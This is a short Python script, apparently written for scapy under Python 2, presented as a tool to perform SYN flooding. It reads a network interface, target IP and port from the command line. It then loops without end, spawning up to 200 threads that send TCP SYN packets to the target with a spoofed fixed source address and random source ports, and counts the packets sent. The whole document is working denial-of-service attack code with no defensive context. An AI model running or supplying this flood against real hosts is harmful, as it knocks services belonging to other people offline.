##Python script to perform SYN Flooding locally


#!/usr/bin/env python

import random
import sys
import threading
from scapy.all import *

interface    = None
target       = None
port         = None
thread_limit = 200
total        = 0

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		i = IP()
		i.src = "192.168.19.131"
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

if __name__ == "__main__":
	# Check for all required arguments
	if len(sys.argv) != 4:
		print "Usage: %s <Interface> <Target IP> <Port>" % sys.argv[0]
		exit()

	# Get required variables
	interface        = sys.argv[1]
	target           = sys.argv[2]
	port             = int(sys.argv[3])
	conf.iface 	 = interface 

	print "Flooding %s:%i with SYN packets." % (target, port)
	while True:
		if threading.activeCount() < thread_limit: 
			sendSYN().start()
			total += 1
			sys.stdout.write("\rTotal packets sent:\t\t\%i" % total)
